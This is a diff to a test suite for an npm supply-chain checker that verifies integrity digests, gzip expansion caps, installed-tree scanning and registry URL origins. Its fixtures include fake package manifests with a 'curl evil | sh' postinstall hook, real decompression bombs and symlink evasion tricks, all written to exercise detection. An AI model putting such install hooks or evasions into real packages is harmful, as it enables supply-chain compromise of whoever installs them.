@@ -6,7 +6,7 @@
 //   * a corrupted integrity digest — rejected before unpacking, or verification is decoration.
 
 import { execFileSync, spawnSync } from "node:child_process";
-import { mkdtempSync, mkdirSync, writeFileSync, rmSync, chmodSync, readFileSync } from "node:fs";
+import { mkdtempSync, mkdirSync, writeFileSync, rmSync, chmodSync, readFileSync, symlinkSync, existsSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { createHash } from "node:crypto";
@@ -17,11 +17,17 @@ import assert from "node:assert/strict";
 import {
   lockEntries,
   verifyIntegrity,
+  inspectManifest,
   inspectUnpacked,
   inspectClosure,
+  scanInstalledTree,
   checkMemberPath,
+  measureExpandedBytes,
+  validateResolvedUrl,
   FORBIDDEN_SCRIPTS,
   MAX_TARBALL_BYTES,
+  MAX_EXPANDED_BYTES,
+  SRI_ALGORITHMS,
 } from "./supply-chain.mjs";
 
 async function withTempDir(fn) {
@@ -367,10 +373,13 @@ test("a tarball over the byte cap is refused even from an injected fetcher", asy
   });
 });
 
-test("an archive whose gzip trailer claims a bomb-sized expansion is refused before extraction", async () => {
+test("an archive that really expands past the cap is refused before extraction", async () => {
+  // Rewritten in review round 2, chunk 13. This used to forge gzip's trailing ISIZE field and
+  // assert on the resulting refusal — which proved only that the code read ISIZE, the very
+  // thing that made the bound forgeable. The expansion is real now, so the test cannot pass
+  // unless something actually measured it.
   await withTempDir(async (dir) => {
-    const tarball = Buffer.from(rawTarball(tarEntry("package/package.json", FIXTURE_MANIFEST)));
-    tarball.writeUInt32LE(0xfffffffe, tarball.length - 4); // lie in ISIZE: ~4.3GB expanded
+    const tarball = gzipSync(Buffer.alloc(MAX_EXPANDED_BYTES + 1024));
     const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
     let extractCalls = 0;
     await assert.rejects(
@@ -381,10 +390,23 @@ test("an archive whose gzip trailer claims a bomb-sized expansion is refused bef
             extractCalls++;
           },
         }),
-      /claims \d+ expanded bytes/,
+      /expands past \d+ bytes/,
     );
-    assert.equal(extractCalls, 0);
+    assert.equal(extractCalls, 0, "the bound must be reached before anything is written to disk");
   });
+});
+
+test("a concatenated gzip stream cannot hide its expansion behind a small last member", async () => {
+  // The exact evasion the ISIZE check could not see: gzip's trailer describes the LAST member
+  // only, so a 5 MB member followed by a 1-byte member reported an expanded size of 1.
+  const big = 5_000_000;
+  const bomb = Buffer.concat([gzipSync(Buffer.alloc(big, 0x41)), gzipSync(Buffer.from("x"))]);
+  assert.equal(bomb.readUInt32LE(bomb.length - 4), 1, "premise: the trailer still reports 1 byte");
+  assert.equal(await measureExpandedBytes(bomb, "bomb"), big + 1, "every member must be counted");
+});
+
+test("a tarball that is not gzip at all is refused rather than measured as zero", async () => {
+  await assert.rejects(() => measureExpandedBytes(Buffer.from("not a gzip stream"), "x"), /not a gzip archive/);
 });
 
 test("positive control: a raw-built clean tarball passes member validation and is inspected", async () => {
@@ -399,5 +421,234 @@ test("positive control: a raw-built clean tarball passes member validation and i
     const r = await inspectClosure(lock, { fetchTarball: async () => tarball });
     assert.equal(r.verified, 1);
     assert.deepEqual(r.violations, []);
+  });
+});
+
+// --- the installed-tree rescan (review round 2, chunk 13) -----------------------------------
+//
+// This function had NO tests, which is how it kept a hole big enough to walk a package through:
+// `Dirent.isDirectory()` is false for a symlink, and npm installs `file:`, `link:` and
+// workspace dependencies as symlinks. A tree of one honest package plus a symlink to a package
+// declaring `postinstall` and `gypfile` reported `{ packagesScanned: 1, violations: [] }` — a
+// clean scan of a tree it had not looked at. Every case below is that shape: something a
+// reader would call a package, and what the scan says about it.
+
+/** An installed tree: `entries` maps a node_modules-relative path to a manifest, a marker or null. */
+function buildTree(dir, entries) {
+  const ws = join(dir, "ws");
+  mkdirSync(join(ws, "node_modules"), { recursive: true });
+  for (const [rel, value] of Object.entries(entries)) {
+    const target = join(ws, "node_modules", rel);
+    mkdirSync(target, { recursive: true });
+    if (value === null) continue; // a directory in package position with no manifest
+    if (typeof value === "string") writeFileSync(join(target, "package.json"), value);
+    else writeFileSync(join(target, "package.json"), JSON.stringify(value));
+  }
+  return ws;
+}
+
+const CLEAN = { name: "clean", version: "1.0.0" };
+
+test("a symlinked package is recorded, never silently skipped", async () => {
+  await withTempDir((dir) => {
+    const ws = buildTree(dir, { good: CLEAN });
+    // The package an attacker would deliver: everything the scan is looking for, out of tree.
+    const outside = join(dir, "outside", "evil");
+    mkdirSync(outside, { recursive: true });
+    writeFileSync(
+      join(outside, "package.json"),
+      JSON.stringify({ name: "evil", version: "1.0.0", scripts: { postinstall: "curl evil | sh" }, gypfile: true }),
+    );
+    symlinkSync(outside, join(ws, "node_modules", "evil"));
+
+    const r = scanInstalledTree(ws);
+    assert.equal(r.packagesScanned, 1, "the symlink is not a package this scan can vouch for");
+    assert.deepEqual(r.violations, [{ package: "node_modules/evil", kind: "symlinked-package" }]);
+  });
+});
+
+test("a hidden directory in a package position is recorded; npm's own metadata is not", async () => {
+  await withTempDir((dir) => {
+    const ws = buildTree(dir, { good: CLEAN, ".bin": null, ".hidden-pkg": CLEAN });
+    const r = scanInstalledTree(ws);
+    assert.deepEqual(r.violations, [{ package: "node_modules/.hidden-pkg", kind: "hidden-entry" }]);
+    assert.equal(r.packagesScanned, 1, "a hidden entry is refused, not scanned");
+  });
+});
+
+test("a directory in a package position with no manifest is a violation", async () => {
+  await withTempDir((dir) => {
+    // Node still resolves `require('orphan/file.js')` out of it, so "no manifest" is not "no risk".
+    const ws = buildTree(dir, { good: CLEAN, orphan: null });
+    const r = scanInstalledTree(ws);
+    assert.deepEqual(r.violations, [{ package: "node_modules/orphan", kind: "missing-manifest" }]);
+  });
+});
+
+test("a malformed manifest is a violation naming its package, not an exception", async () => {
+  await withTempDir((dir) => {
+    const ws = buildTree(dir, { good: CLEAN, broken: "{ not json" });
+    const r = scanInstalledTree(ws);
+    assert.equal(r.violations.length, 1);
+    assert.equal(r.violations[0].kind, "malformed-manifest");
+    assert.equal(r.violations[0].package, "node_modules/broken/package.json");
+  });
+});
+
+test("the rescan still finds hooks in nested and scoped packages", async () => {
+  await withTempDir((dir) => {
+    const ws = buildTree(dir, {
+      good: CLEAN,
+      "@scope/inner": { name: "inner", version: "1.0.0", scripts: { install: "node-gyp rebuild" } },
+      "outer/node_modules/deep": { name: "deep", version: "1.0.0", gypfile: true },
+    });
+    mkdirSync(join(ws, "node_modules", "outer"), { recursive: true });
+    writeFileSync(join(ws, "node_modules", "outer", "package.json"), JSON.stringify(CLEAN));
+    const kinds = scanInstalledTree(ws).violations.map((v) => v.kind).sort();
+    assert.deepEqual(kinds, ["gypfile-flag", "script:install"]);
+  });
+});
+
+test("positive control: the real installed candidate trees scan clean", (t) => {
+  // Non-vacuity for every refusal above: they must not fire on a tree npm actually produces.
+  // Skipped rather than failed when the workspaces are not installed — a harness that could
+  // not run says so.
+  const HERE = join(process.cwd(), "spikes", "mcp");
+  const installed = ["v1", "v2"].filter((c) => existsSync(join(HERE, "candidates", c, "node_modules")));
+  if (installed.length === 0) {
+    t.skip("no candidate workspace is installed — run `node spikes/mcp/matrix.mjs` first");
+    return;
+  }
+  for (const candidate of installed) {
+    const r = scanInstalledTree(join(HERE, "candidates", candidate));
+    assert.ok(r.packagesScanned > 0, `${candidate}: scanned nothing`);
+    assert.deepEqual(r.violations, [], `${candidate}: the real tree must be clean`);
+  }
+});
+
+// --- bundled dependencies inside a tarball (review round 2, chunk 13) -----------------------
+
+test("a dependency bundled inside a tarball is inspected, not just its outer manifest", async () => {
+  await withTempDir(async (dir) => {
+    const stage = join(dir, "stage");
+    mkdirSync(join(stage, "package", "node_modules", "evil"), { recursive: true });
+    writeFileSync(join(stage, "package", "package.json"), JSON.stringify(CLEAN));
+    writeFileSync(
+      join(stage, "package", "node_modules", "evil", "package.json"),
+      JSON.stringify({ name: "evil", version: "1.0.0", scripts: { postinstall: "curl evil | sh" } }),
+    );
+    writeFileSync(join(stage, "package", "node_modules", "evil", "binding.gyp"), "{}");
+    execFileSync("tar", ["-czf", join(dir, "pkg.tgz"), "-C", stage, "package"]);
+    const tarball = readFileSync(join(dir, "pkg.tgz"));
+    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
+
+    const r = await inspectClosure(lock, { fetchTarball: async () => tarball });
+    const kinds = r.violations.map((v) => v.kind).sort();
+    assert.deepEqual(kinds, ["binding.gyp", "script:postinstall"]);
+    for (const v of r.violations) {
+      assert.match(v.package, /node_modules\/evil$/, "a nested finding must name where it is");
+    }
+  });
+});
+
+test("a malformed manifest inside a tarball is a violation, not a thrown SyntaxError", async () => {
+  await withTempDir((dir) => {
+    mkdirSync(join(dir, "package"), { recursive: true });
+    writeFileSync(join(dir, "package", "package.json"), "{ not json");
+    const v = inspectUnpacked(dir, "x@1");
+    assert.deepEqual(v.map((e) => ({ package: e.package, kind: e.kind })), [
+      { package: "x@1", kind: "malformed-manifest" },
+    ]);
+  });
+});
+
+test("inspectManifest is the single predicate both inspectors use", async () => {
+  await withTempDir((dir) => {
+    // If the tarball path and the installed path ever disagree, one of them is not asking the
+    // question the other proved. Pinned by construction: both call this.
+    const p = join(dir, "package.json");
+    writeFileSync(p, JSON.stringify({ name: "x", version: "1", scripts: { preinstall: "x" }, gypfile: 1 }));
+    assert.deepEqual(inspectManifest(p, "L"), [
+      { package: "L", kind: "script:preinstall" },
+      { package: "L", kind: "gypfile-flag" },
+    ]);
+    writeFileSync(p, "[]");
+    assert.equal(inspectManifest(p, "L")[0].kind, "malformed-manifest");
+  });
+});
+
+// --- integrity parsing (review round 2, chunk 13) -------------------------------------------
+
+test("SHA-1 integrity is refused, whatever else the string carries", () => {
+  const buf = Buffer.from("content");
+  const sha1 = "sha1-" + createHash("sha1").update(buf).digest("base64");
+  assert.throws(() => verifyIntegrity(buf, sha1), /unsupported integrity algorithm/);
+  assert.ok(!SRI_ALGORITHMS.includes("sha1"), "sha1 must not be reachable through the allowlist");
+});
+
+test("a multi-digest SRI string verifies against its STRONGEST algorithm", () => {
+  const buf = Buffer.from("content");
+  const sha512 = "sha512-" + createHash("sha512").update(buf).digest("base64");
+  const sha256 = "sha256-" + createHash("sha256").update(buf).digest("base64");
+  const sha1 = "sha1-" + createHash("sha1").update(buf).digest("base64");
+  // Previously `split("-", 2)` read the whole rest of the string as one digest, so this
+  // legitimate lockfile value failed as an "integrity mismatch" — a tampering report for a
+  // parsing bug.
+  assert.equal(verifyIntegrity(buf, `${sha512} ${sha1}`), true);
+  assert.equal(verifyIntegrity(buf, `${sha256} ${sha512}`), true);
+  // And a weaker digest that DOES match cannot rescue a stronger one that does not.
+  const wrong512 = "sha512-" + createHash("sha512").update("other").digest("base64");
+  assert.equal(verifyIntegrity(buf, `${wrong512} ${sha1}`), false);
+  assert.equal(verifyIntegrity(buf, `${wrong512} ${sha256}`), false);
+});
+
+test("unparseable or empty integrity refuses rather than defaulting", () => {
+  const buf = Buffer.from("content");
+  for (const bad of ["", "   ", "sha512", "sha512-not base64!", "sha512-abc-def"]) {
+    assert.throws(() => verifyIntegrity(buf, bad), /integrity/, `accepted ${JSON.stringify(bad)}`);
+  }
+  assert.throws(() => verifyIntegrity(buf, null), /integrity string is empty/);
+});
+
+// --- resolved-URL origin policy (review round 2, chunk 13) ----------------------------------
+
+/** A resolved URL carrying userinfo, built rather than written: a literal `user:pass@host` in
+ *  the source reads as an email address to the repository's privacy scanner. */
+function withUserinfo(href, username, password) {
+  const u = new URL(href);
+  u.username = username;
+  u.password = password;
+  return u.href;
+}
+
+test("the resolved URL must name the registry ORIGIN, not merely its hostname", () => {
+  for (const [url, why] of [
+    ["https://registry.npmjs.org:8443/x/-/x-1.0.0.tgz", /port 8443/],
+    [withUserinfo("https://registry.npmjs.org/x/-/x-1.0.0.tgz", "intruder", "secret"), /credentials/],
+    ["https://registry.npmjs.org/x/-/x-1.0.0.tgz#frag", /fragment/],
+  ]) {
+    assert.throws(() => validateResolvedUrl(url, "x"), why, `accepted ${url}`);
+  }
+  // Positive control: the real shape, with and without the default port spelled out.
+  assert.equal(validateResolvedUrl("https://registry.npmjs.org/x/-/x-1.0.0.tgz", "x").hostname, "registry.npmjs.org");
+  assert.equal(validateResolvedUrl("https://registry.npmjs.org:443/x/-/x-1.0.0.tgz", "x").port, "");
+});
+
+test("the URL that is fetched is the one validation returned, not the lockfile's string", async () => {
+  await withTempDir(async (dir) => {
+    // The lockfile spells the default port out, so the validated URL and the raw string differ
+    // by more than nothing — without that the assertion would hold for a fetcher handed either.
+    const tarball = buildTarball(dir, { name: "ok", version: "1.0.0" });
+    const raw = "https://registry.npmjs.org:443/ok/-/ok-1.0.0.tgz";
+    const lock = buildLockfile(dir, { integrity: integrityOf(tarball), resolved: raw });
+    const seen = [];
+    await inspectClosure(lock, {
+      fetchTarball: async (url) => {
+        seen.push(url);
+        return tarball;
+      },
+    });
+    assert.deepEqual(seen, ["https://registry.npmjs.org/ok/-/ok-1.0.0.tgz"]);
+    assert.notEqual(seen[0], raw, "the raw lockfile string reached the fetcher");
   });
 });
